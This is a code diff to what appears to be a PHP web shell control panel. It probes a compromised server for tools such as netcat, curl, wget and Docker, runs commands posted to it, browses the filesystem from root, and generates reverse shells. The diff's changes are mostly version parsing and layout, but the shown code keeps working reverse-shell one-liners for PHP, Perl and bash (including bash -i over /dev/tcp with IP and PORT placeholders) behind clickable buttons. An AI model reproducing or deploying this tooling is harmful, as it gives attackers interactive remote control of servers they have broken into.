@@ -200,7 +200,7 @@ function get_regex_version($command, $regex, $available_methods)
 
     $output = execute_command($command, $method);
 
-    return preg_match($regex, $output, $m) ? $m[1] : 'Not found';
+    return preg_match($regex, $output, $m) ? $m[1] : 'X';
 }
 
 function check_install(string $command, ?string $check = null, array $available_methods = []): string
@@ -289,60 +289,60 @@ $available_ce_methods = check_command_execution();
 $services = [
     'NetCat' => [
         'status' => check_install('nc -h', 'connect to somewhere:', $available_ce_methods),
-        'version' => get_regex_version('nc -h', '/\[(v[^\]]+)\]/', $available_ce_methods)
+        'version' => get_regex_version('nc -h 2>&1', '/\[(v[^\]]+)\]/', $available_ce_methods)
     ],
     'SSH' => [
         'status' => check_install('ssh', 'usage: ssh', $available_ce_methods),
-        'version' => get_regex_version('ssh -V', '/OpenSSH_([\d\.p]+)/', $available_ce_methods)
+        'version' => get_regex_version('ssh -V 2>&1', '/OpenSSH_([\d\.p]+)/', $available_ce_methods)
     ],
     'MySQL' => [
         'status' => check_install('mysql --version', 'mysql from ', $available_ce_methods),
-        'version' => get_regex_version('mysql --version', '/Ver\s+([\d\.]+)-MariaDB/', $available_ce_methods)
+        'version' => get_regex_version('mysql --version 2>&1', '/Ver\s+([\d\.]+)-MariaDB/', $available_ce_methods)
     ],
     'MariaDB' => [
         'status' => check_install('mariadb --version', 'mariadb from ', $available_ce_methods),
-        'version' => get_regex_version('mariadb --version', '/Ver\s+([\d\.]+)-MariaDB/', $available_ce_methods)
+        'version' => get_regex_version('mariadb --version 2>&1', '/Ver\s+([\d\.]+)-MariaDB/', $available_ce_methods)
     ],
     'PostgreSQL' => [
         'status' => check_install('psql --help', 'psql is the PostgreSQL', $available_ce_methods),
-        'version' => get_regex_version('psql --version', '/psql \(PostgreSQL\) ([\d\.]+) /', $available_ce_methods)
+        'version' => get_regex_version('psql --version 2>&1', '/psql \(PostgreSQL\) ([\d\.]+) /', $available_ce_methods)
     ],
     'Python' => [
         'status' => check_install('python --help', 'usage: python', $available_ce_methods),
-        'version' => execute_command('python --version', $available_ce_methods),
+        'version' => get_regex_version('python --version 2>&1','/Python\s+([\d.]+)/', $available_ce_methods),
         'shell' => 'a'
     ],
     'PHP' => [
         'status' => check_install('php --help', 'Usage: php', $available_ce_methods),
-        'version' => get_regex_version('php --version', '/PHP\s+([\d\.]+)/', $available_ce_methods),
+        'version' => get_regex_version('php --version 2>&1', '/PHP\s+([\d\.]+)/', $available_ce_methods),
         'shell' => 'php -r \'$sock=fsockopen("IP",PORT);system("bash <&3 >&3 2>&3");\''
     ],
     'Perl' => [
         'status' => check_install('perl --help', 'Usage: perl', $available_ce_methods),
-        'version' => get_regex_version('perl --version', '/\(v([\d\.]+)\)/', $available_ce_methods),
+        'version' => get_regex_version('perl --version 2>&1', '/\(v([\d\.]+)\)/', $available_ce_methods),
         'shell' => 'perl -e \'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};\''
     ],    
     'Ruby' => [
         'status' => check_install('ruby --help', 'ruby [switches]', $available_ce_methods),
-        'version' => get_regex_version('ruby --version', '/ruby\s+([\d\.]+)p\d+/', $available_ce_methods),
+        'version' => get_regex_version('ruby --version 2>&1', '/ruby\s+([\d\.]+)p\d+/', $available_ce_methods),
         'shell' => 'a'
     ],
     'bash' => [
         'status' => check_install('bash --version', 'GNU bash,', $available_ce_methods),
-        'version' => get_regex_version('bash --version', '/version\s+([\d\.]+)\(/', $available_ce_methods),
+        'version' => get_regex_version('bash --version 2>&1', '/version\s+([\d\.]+)\(/', $available_ce_methods),
         'shell' => 'bash -i >& /dev/tcp/IP/PORT 0>&1'
     ],
     'cURL' => [
         'status' => check_install('curl --help', 'Usage: curl', $available_ce_methods),
-        'version' => get_regex_version('curl --version', '/\bcurl\s+([\d\.]+)\b/', $available_ce_methods)
+        'version' => get_regex_version('curl --version 2>&1', '/\bcurl\s+([\d\.]+)\b/', $available_ce_methods)
     ],
     'wget' => [
         'status' => check_install('wget --help', 'Usage: wget', $available_ce_methods),
-        'version' => get_regex_version('wget --version', '/GNU Wget\s+([\d\.]+)/', $available_ce_methods)
+        'version' => get_regex_version('wget --version 2>&1', '/GNU Wget\s+([\d\.]+)/', $available_ce_methods)
     ],
     'Docker' => [
         'status' => check_install('docker --help', 'Usage:  docker', $available_ce_methods),
-        'version' => get_regex_version('docker --version', '/Docker version ([\d\.]+)/', $available_ce_methods)
+        'version' => get_regex_version('docker --version 2>&1', '/Docker version ([\d\.]+)/', $available_ce_methods)
     ]
 ];
 
@@ -532,7 +532,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
         }
         .grid {
             display: grid;
-            grid-template-columns: 1fr 1fr;
+            grid-template-columns: calc(50vw - 0.25rem) calc(50vw - 0.25rem);
             grid-template-rows: 1fr 1fr 1fr 1fr;
             gap: 0.5rem;
             height: 100vh;
@@ -562,22 +562,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
             background: #333;
             color: #0f0;
             cursor: pointer;
+            width: 150px !important;
         }
         .btn:hover:not(:disabled) {
             background: #0f0;
             color: #000;
+            width: 150px !important;
         }
         .btn-red{
             background: #333;
             color: #f00 !important;
             cursor: pointer;
+            width: 150px !important;
         }
         .btn-red:hover:not(:disabled){
             background: #f00 !important;
             color: #000 !important;
+            width: 150px !important;
         }
         .btn:disabled,.btn-red:disabled{
             background: #1a1a1a !important;
+            width: 150px !important;
         }
         table {
             width: 100%;
@@ -721,28 +726,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
     <div class="grid">
         <div class="card">
             <!-- Services, Auto Revshell Generator -->
-            <div class="card flex-row">
-                <h3>Services</h3>
-                <?php
-                foreach ($services as $name => $service) {
-                    $is_disabled = isset($service['status']) && $service['status'] === 'NO';
-                    $has_shell = !empty($service['shell'] ?? '');
-                
-                    // Determine class
-                    $class = $is_disabled ? 'btn-red' : 'btn';
-                
-                    // Determine attributes
-                    if ($is_disabled || !$has_shell) {
-                        $attributes = 'disabled';
-                    } else {
-                        $escaped_shell = htmlspecialchars(str_replace("'", "\\'", $service['shell']));
-                        $attributes = 'onclick="genShell(\'' . $escaped_shell . '\')"';
-                    }
-                
-                    echo '<button class="' . $class . '" ' . $attributes . '>' . htmlspecialchars($name) . '</button>' . PHP_EOL;
-                }                
-                ?>
-            </div>
             <div class="card">
                 <h3>Reverse Shell</h3>
                 <div class="flex-row">
@@ -751,10 +734,34 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exec_cmd'], $_POST['e
                 </div>
                 <pre class="card" id="revshell" style="white-space:pre-wrap">Generate revshell by clicking on Services</pre>
             </div>
+            <div class="card">
+                <h3>Services</h3>
+                <div class="flex-row" style="flex-wrap: wrap">
+                    <?php
+                    foreach ($services as $name => $service) {
+                        $is_disabled = isset($service['status']) && $service['status'] === 'NO';
+                        $has_shell = !empty($service['shell'] ?? '');
+                    
+                        // Determine class
+                        $class = $is_disabled ? 'btn-red' : 'btn';
+                    
+                        // Determine attributes
+                        if ($is_disabled || !$has_shell) {
+                            $attributes = 'disabled';
+                        } else {
+                            $escaped_shell = htmlspecialchars(str_replace("'", "\\'", $service['shell']));
+                            $attributes = 'onclick="genShell(\'' . $escaped_shell . '\')"';
+                        }
+                        echo '<button class="' . $class . '" ' . $attributes . '>' . htmlspecialchars($name) . '&nbsp;:&nbsp;' . htmlspecialchars($service['version']) . '</button>' . PHP_EOL;
+                    }                
+                    ?>
+                </div>
+            </div>
         </div>
         <div id="file-tree-container" class="card span-row">
             <h3>Folders And Files</h3>
             <ul id="file-tree">
+                <li class="root-item"><span class="folder" data-path="/">/ (root)</span><div class="nested">
                 <?php listDirectory('/'); ?>
             </ul>   
         </div>
